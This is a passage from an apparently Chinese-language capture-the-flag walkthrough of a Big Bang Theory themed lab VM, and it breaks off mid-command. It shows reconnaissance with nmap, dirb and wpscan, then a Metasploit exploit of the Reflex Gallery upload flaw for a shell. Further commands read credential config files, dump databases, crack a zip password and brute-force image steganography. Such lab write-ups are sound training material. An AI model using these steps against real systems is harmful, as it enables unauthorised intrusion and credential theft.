Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)</span><br><span class="line">|   256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)</span><br><span class="line">|_  256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Fun with flags!</span><br><span class="line">1337&#x2F;tcp open  waste?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: </span><br><span class="line">|_    FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port1337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;31%Time&#x3D;5E82D546%P&#x3D;x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GenericLine</span><br><span class="line">SF:s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GetRequest,2</span><br><span class="line">SF:F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(HTTPOptions,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RTSPRequest,2F,&quot;F</span><br><span class="line">SF:LAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RPCCheck,2F,&quot;FLAG-s</span><br><span class="line">SF:heldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSStatusRequestT</span><br><span class="line">SF:CP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Help,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SSLSessionReq,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServerCookie</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TLSSessionReq</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Kerberos,2F,&quot;</span><br><span class="line">SF:FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SMBProgNeg,2F,&quot;FLA</span><br><span class="line">SF:G-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(X11Probe,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(FourOhFourRequest,2F,&quot;FLAG</span><br><span class="line">SF:-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LPDString,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPSearchReq,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPBindReq,2F,&quot;FLAG-sheld</span><br><span class="line">SF:on&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SIPOptions,2F,&quot;FLAG-sheldon&#123;</span><br><span class="line">SF:cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LANDesk-RC,2F,&quot;FLAG-sheldon&#123;cf8</span><br><span class="line">SF:8b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServer,2F,&quot;FLAG-sheldon&#123;cf</span><br><span class="line">SF:88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(NCP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb1</span><br><span class="line">SF:0c4005c1f2781a069cf8&#125;\n&quot;)%r(NotesRPC,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c400</span><br><span class="line">SF:5c1f2781a069cf8&#125;\n&quot;)%r(JavaRMI,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f27</span><br><span class="line">SF:81a069cf8&#125;\n&quot;)%r(WMSRequest,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a</span><br><span class="line">SF:069cf8&#125;\n&quot;)%r(oracle-tns,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069</span><br><span class="line">SF:cf8&#125;\n&quot;)%r(ms-sql-s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\</span><br><span class="line">SF:n&quot;)%r(afp,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(giop</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;);</span><br><span class="line">MAC Address: 08:00:27:F7:18:EC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.012 days (since Tue Mar 31 01:13:02 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>nmap在扫描结果中就给出了FLAG-sheldon<br />实际上使用nc就能获得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.105 1337</span><br><span class="line"></span><br><span class="line">FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</code></strong></p><p>nmap在扫描时给出了80端口上<code>robots.txt</code>的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br></pre></td></tr></table></figure><p>测试之后发现只有<code>/howard</code>可以访问</p><h2 id="web路径枚举-14"><a class="markdownIt-Anchor" href="#web路径枚举-14"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.1.105/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.105&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;index.html (CODE:200|SIZE:239)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;javascript&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;phpmyadmin&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;private&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;robots.txt (CODE:200|SIZE:112)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;server-status (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><p>可以看到存在phpmyadmin框架和wordpress框架</p><ul><li>访问<code>/private</code>，看起来像是一个自建的站点</li><li>尝试后发现<code>/private/login.php</code>，可以尝试SQL注入或者收集信息再进行登入爆破</li><li>访问<code>/howard</code></li><li><code>/howard/stolen_data/pennys_lastname.txt</code>中记录内容为<code>ERROR 404</code></li></ul><h2 id="漏洞利用-14"><a class="markdownIt-Anchor" href="#漏洞利用-14"></a> 漏洞利用</h2><p>使用wpscan对wordpress站点进行扫描</p><p><code>wpscan --url http://192.168.1.105/music/wordpress -e u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] footprintsonthemoon</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] kripke</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] stuart</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>得到三个账户的用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress -e ap</span><br><span class="line"></span><br><span class="line">[+] reflex-gallery</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;</span><br><span class="line"> | Last Updated: 2019-05-10T16:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.1.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 3.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>得到插件信息</p><p>搜索插件相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">searchsploit reflex gallery</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                       |  Path</span><br><span class="line">                                                                     | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) | exploits&#x2F;php&#x2F;remote&#x2F;36809.rb</span><br><span class="line">WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload        | exploits&#x2F;php&#x2F;webapps&#x2F;36374.txt</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>在MSF中搜索相关EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search reflex</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability</span><br></pre></td></tr></table></figure><p>使用EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload</span><br><span class="line">set RHOSTS 192.168.1.105</span><br><span class="line">set TARGETURI &#x2F;music&#x2F;wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功获取Shell</p><h2 id="权限提升-14"><a class="markdownIt-Anchor" href="#权限提升-14"></a> 权限提升</h2><ul><li>FLAG-raz</li></ul><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看wordpress的数据库配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;music&#x2F;wordpress&#x2F;wp-config.php | grep -i db</span><br><span class="line"></span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;footprintsonthemoon1337&#39; );</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure><p>连接数据库<br /><code>mysql -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 footprintsonthemoon</code></p><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+---------------------+</span><br><span class="line">| Database            |</span><br><span class="line">+---------------------+</span><br><span class="line">| information_schema  |</span><br><span class="line">| footprintsonthemoon |</span><br><span class="line">+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>退出mysql并导出数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">mysqldump -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 --databases footprintsonthemoon &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;dump.sql</span><br></pre></td></tr></table></figure><p>在Kali中下载备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;dump.sql</span><br></pre></td></tr></table></figure><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat dump.sql | grep &quot;FLAG&quot; --color&#x3D;auto</span><br><span class="line"></span><br><span class="line">FLAG-raz&#123;40d17a74e28a62eac2df19e206f0987c&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里导出的数据在Kali中用grep节选时如果没有用高亮就很难找</p></blockquote><ul><li>FLAG-bernadette</li></ul><p>查看<code>/private</code>站点的数据库配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;private&#x2F;db_config.php | grep -i db</span><br><span class="line"></span><br><span class="line">$DBUSER &#x3D; &#39;bigpharmacorp&#39;;</span><br><span class="line">$DBPASS &#x3D; &#39;weareevil&#39;;</span><br><span class="line">$con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,$DBUSER,$DBPASS,&quot;bigpharmacorp&quot;);</span><br></pre></td></tr></table></figure><p>连接数据库<br /><code>mysql -h localhost -u bigpharmacorp -pweareevil</code></p><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| bigpharmacorp      |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">use bigpharmacorp；</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line">+-------------------------+</span><br><span class="line">| Tables_in_bigpharmacorp |</span><br><span class="line">+-------------------------+</span><br><span class="line">| products                |</span><br><span class="line">| users                   |</span><br><span class="line">+-------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">select * from users;</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">| id | username   | password                         | fname      | description                                       |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">|  1 | admin      | 3fc0a7acf087f549ac2b266baf94b8b1 | josh       | Dont mess with me                                 |</span><br><span class="line">|  2 | bobby      | 8cb1fb4a98b9c43b7ef208d624718778 | bob        | I like playing football.                          |</span><br><span class="line">|  3 | penny69    | cafa13076bb64e7f8bd480060f6b2332 | penny      | Hi I am Penny I am new here!! &lt;3                  |</span><br><span class="line">|  4 | mitsos1981 | 05d51709b81b7e0f1a9b6b4b8273b217 | dimitris   | Opa re malaka!                                    |</span><br><span class="line">|  5 | alicelove  | e146ec4ce165061919f887b70f49bf4b | alice      | Eat Pray Love                                     |</span><br><span class="line">|  6 | bernadette | dc5ab2b32d9d78045215922409541ed7 | bernadette | FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125;</code></strong></p><ul><li>FLAG-amy</li></ul><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;amy&#x2F;</span><br><span class="line">total 12</span><br><span class="line">-rwxrwxrwx 1 amy amy  434 Mar  4 16:30 notes.txt</span><br><span class="line">-rwxr-xr-x 1 amy amy 7488 Mar  6 00:06 secretdiary</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;amy&#x2F;notes.txt</span><br><span class="line">This is my secret diary.</span><br><span class="line">The safest way to keep my secrets is inside a compiled executable program.</span><br><span class="line">As soon as I get popular now, that I have friends, I will start adding my secrets here.</span><br><span class="line">I have used a really strong password that it cant be bruteforced.</span><br><span class="line">Seriously it is 18 digit, alphanumeric, uppercase&#x2F;lowercase with symbols.</span><br><span class="line">And since my program is already compiled, no one can read the source code in order to view the password!</span><br></pre></td></tr></table></figure><p>可以判断<code>/home/amy/secretdiary</code>是一个可执行程序</p><p>使用strings命令查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings secretdiary</span><br><span class="line"></span><br><span class="line">P@SSw0rd123Sh3ld0n</span><br><span class="line">Login Success!</span><br><span class="line">Soon I will be adding my secrets here..</span><br><span class="line">FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</code></strong></p><ul><li>FLAG-penny</li></ul><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home&#x2F;penny</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  4 penny penny 4096 Mar  6 00:37 .</span><br><span class="line">drwxr-xr-x 10 root  root  4096 Mar  4 02:33 ..</span><br><span class="line">-rw-rw-r--  1 penny penny   61 Mar  5 00:26 .FLAG.penny.txt</span><br><span class="line">-rw-------  1 penny penny   57 Mar  6 00:47 .bash_history</span><br><span class="line">-rw-r--r--  1 penny penny  220 Sep  1  2015 .bash_logout</span><br><span class="line">-rw-r--r--  1 penny penny 3771 Sep  1  2015 .bashrc</span><br><span class="line">drwx------  2 penny penny 4096 Mar  6 00:37 .cache</span><br><span class="line">drwxrwxr-x  2 penny penny 4096 Mar  5 00:26 .nano</span><br><span class="line">-rw-r--r--  1 penny penny  655 May 16  2017 .profile</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;penny&#x2F;.FLAG.penny.txt</span><br><span class="line">RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;</span><br></pre></td></tr></table></figure><p>base64 decode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;&quot; | base64 -d</span><br><span class="line">FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</code></strong></p><ul><li>FLAG-howard</li></ul><p>将FTP根目录打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r &#x2F;var&#x2F;www&#x2F;html&#x2F;ftp.zip &#x2F;var&#x2F;ftp</span><br></pre></td></tr></table></figure><p>在Kali下载并解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;ftp.zip</span><br><span class="line">unzip ftp.zip</span><br></pre></td></tr></table></figure><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -l var&#x2F;ftp&#x2F;pub&#x2F;howard</span><br><span class="line">total 36</span><br><span class="line">-rw-r--r-- 1 root root   273 Mar  3 17:05 note.txt</span><br><span class="line">-rw-r--r-- 1 root root 30762 Mar  5 19:29 super_secret_nasa_stuff_here.zip</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;note.txt</span><br><span class="line">Please go away, nothing interesing here. I just had to temporary store some nasa data here</span><br><span class="line">because my laptop had a virus from some weird websites I visited ... anyway ...</span><br><span class="line">And don&#39;t bother looking at my secret data  I have encrypted them pretty well. I am an MIT  engineer!</span><br></pre></td></tr></table></figure><p>爆破压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u super_secret_nasa_stuff_here.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw &#x3D;&#x3D; astronaut</span><br><span class="line"></span><br><span class="line">unzip -P astronaut super_secret_nasa_stuff_here.zip</span><br><span class="line">Archive:  super_secret_nasa_stuff_here.zip</span><br><span class="line">  inflating: marsroversketch.jpg</span><br></pre></td></tr></table></figure><p>隐写爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip3 install stegcracker</span><br><span class="line"></span><br><span class="line">stegcracker var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">Successfully cracked file with password: iloveyoumom</span><br><span class="line">Tried 51349 passwords</span><br><span 